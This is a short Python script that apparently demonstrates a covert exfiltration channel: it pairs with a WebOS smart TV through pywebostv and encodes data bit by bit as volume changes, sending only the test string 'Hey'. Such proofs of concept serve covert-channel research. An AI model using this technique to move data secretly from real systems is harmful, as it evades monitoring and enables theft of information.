from pywebostv.connection import *
from pywebostv.controls import *
from binary_utils import to_bits
from time import sleep

TV_IP = "*.*.*.*"


def connect_to_tv():
    """
    Connect to WebOS TV
    :return: client
    """
    client = WebOSClient(TV_IP)
    client.connect()
    store = {}

    for status in client.register(store):
        if status == WebOSClient.PROMPTED:
            print("Please accept the connect on the TV!")
        elif status == WebOSClient.REGISTERED:
            print("Registration successful!")

    return client


def leak_data(client, data):
    """
    Leak data over tv
    :param client: client tv
    :param data: data to lead
    """
    media = MediaControl(client)
    bits = to_bits(data)

    for bit in bits:
        media.set_volume(2)
        media.set_volume(bit)
        sleep(2)


if __name__ == "__main__":
    tv_client = connect_to_tv()
    leak_data(tv_client, "Hey")
